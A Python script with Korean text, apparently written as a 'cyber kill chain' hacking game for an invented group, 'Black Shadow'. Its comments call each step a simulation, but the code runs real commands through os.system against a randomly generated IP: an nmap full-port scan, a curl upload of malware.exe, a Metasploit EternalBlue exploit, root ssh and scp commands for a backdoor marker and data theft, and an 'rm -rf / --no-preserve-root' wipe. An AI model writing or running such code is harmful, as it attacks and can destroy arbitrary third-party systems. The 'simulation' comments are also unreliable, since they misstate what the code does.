import os
import random
import time

class CyberKillChainGame:
    def __init__(self):
        self.target_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
        self.open_ports = []
        self.detected_vulnerabilities = []
        self.stage = 0

    def start_game(self):
        print("=== 사이버 킬체인 게임에 오신 것을 환영합니다! ===")
        print("당신은 악명 높은 해킹 조직 'Black Shadow'의 신입 해커입니다.")
        print(f"오늘의 목표: 타깃 IP 주소 {self.target_ip} 에 침입하여 데이터를 탈취하세요.\n")

        # 게임 스토리 흐름을 시작합니다.
        self.reconnaissance()

    def reconnaissance(self):
        print("1. Reconnaissance (정찰 단계)")
        print(f"타깃 시스템 {self.target_ip} 에 대한 정보를 수집합니다.")
        
        choice = input("Nmap으로 포트 스캔을 시도하시겠습니까? (y/n): ")
        if choice.lower() == 'y':
            # Nmap 포트 스캔 명령어 실행
            scan_command = f"nmap -p- {self.target_ip}"
            print(f"   실행 중: {scan_command}")
            os.system(scan_command)

            # 랜덤하게 몇 개의 열린 포트를 시뮬레이션
            self.open_ports = random.sample(range(1, 65536), 3)
            print(f"   스캔 완료. 열린 포트: {self.open_ports}\n")
        else:
            print("스캔을 하지 않았습니다. 타겟 정보를 알 수 없습니다.\n")

        self.weaponization()

    def weaponization(self):
        print("2. Weaponization (무기화 단계)")
        print("수집한 정보로 악성코드를 제작하고, 타겟 취약점을 분석합니다.")

        # 취약점 분석 시뮬레이션
        self.detected_vulnerabilities = random.choice([
            ["CVE-2022-1234", "CVE-2021-5678"],
            ["취약점 없음"]
        ])

        if "취약점 없음" in self.detected_vulnerabilities:
            print("   취약점이 발견되지 않았습니다. 공격 불가.\n")
        else:
            print(f"   발견된 취약점: {', '.join(self.detected_vulnerabilities)}")
            print("   악성코드를 생성합니다...\n")

        self.delivery()

    def delivery(self):
        if "취약점 없음" in self.detected_vulnerabilities:
            print("   공격에 필요한 취약점이 없어 진행할 수 없습니다.\n")
            return

        print("3. Delivery (전달 단계)")
        print("악성코드를 타겟 시스템에 전달하는 중입니다...")

        choice = input("악성코드를 피싱 이메일 또는 웹 취약점으로 전달하시겠습니까? (1. 피싱, 2. 웹 취약점): ")

        if choice == '1':
            # 실제 공격은 아니고 시뮬레이션
            print("   피싱 이메일로 악성코드를 전달했습니다. 성공!\n")
        elif choice == '2':
            # 실제 명령 실행 (curl로 파일 업로드 시뮬레이션)
            delivery_command = f"curl -T malware.exe http://{self.target_ip}/upload"
            print(f"   실행 중: {delivery_command}")
            os.system(delivery_command)
            print("   웹 취약점을 통해 악성코드 전달 완료.\n")

        self.exploitation()

    def exploitation(self):
        if "취약점 없음" in self.detected_vulnerabilities:
            print("   취약점이 없어 공격할 수 없습니다.\n")
            return

        print("4. Exploitation (취약점 공격 단계)")
        print("취약점을 이용해 타겟 시스템에 접근합니다.")

        # Metasploit으로 취약점 공격 시뮬레이션
        exploit_command = f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST {self.target_ip}; exploit'"
        print(f"   실행 중: {exploit_command}")
        os.system(exploit_command)
        print("   취약점 공격 성공!\n")

        self.installation()

    def installation(self):
        print("5. Installation (설치 단계)")
        print("악성코드를 시스템에 설치하고 지속적인 접근 권한을 확보합니다.")

        # 백도어 설치 시뮬레이션
        install_command = f"ssh root@{self.target_ip} 'echo \"Backdoor installed\" > /root/backdoor.txt'"
        print(f"   실행 중: {install_command}")
        os.system(install_command)
        print("   백도어 설치 완료.\n")

        self.command_and_control()

    def command_and_control(self):
        print("6. Command and Control (명령 및 제어 단계)")
        print("시스템을 원격으로 제어하고 데이터를 탈취할 준비가 되었습니다.")

        # 데이터 탈취 시뮬레이션
        choice = input("데이터를 소량으로 탈취하시겠습니까 아니면 대량으로 탈취하시겠습니까? (1. 소량, 2. 대량): ")

        if choice == '1':
            # 소량 데이터 탈취
            print(f"   {self.target_ip}에서 데이터를 소량 탈취합니다...")
            os.system(f"scp root@{self.target_ip}:/path/to/small_data ./")
            print("   소량 데이터 탈취 성공!\n")
        elif choice == '2':
            # 대량 데이터 탈취
            print(f"   {self.target_ip}에서 대량 데이터를 탈취합니다...")
            os.system(f"scp root@{self.target_ip}:/path/to/large_data ./")
            print("   대량 데이터 탈취 성공!\n")

        self.actions_on_objectives()

    def actions_on_objectives(self):
        print("7. Actions on Objectives (목표 달성 단계)")
        print("이제 목표를 달성할 차례입니다.")

        choice = input("데이터를 탈취하시겠습니까 아니면 시스템을 파괴하시겠습니까? (1. 데이터 탈취, 2. 시스템 파괴): ")

        if choice == '1':
            print(f"   {self.target_ip}에서 데이터를 성공적으로 탈취했습니다!")
        elif choice == '2':
            destroy_command = f"ssh root@{self.target_ip} 'rm -rf / --no-preserve-root'"
            print(f"   실행 중: {destroy_command}")
            os.system(destroy_command)
            print("   타겟 시스템을 파괴했습니다!")

        print("미션 완료! 해킹 성공!\n")

# 게임 시작
if __name__ == "__main__":
    game = CyberKillChainGame()
    game.start_game()
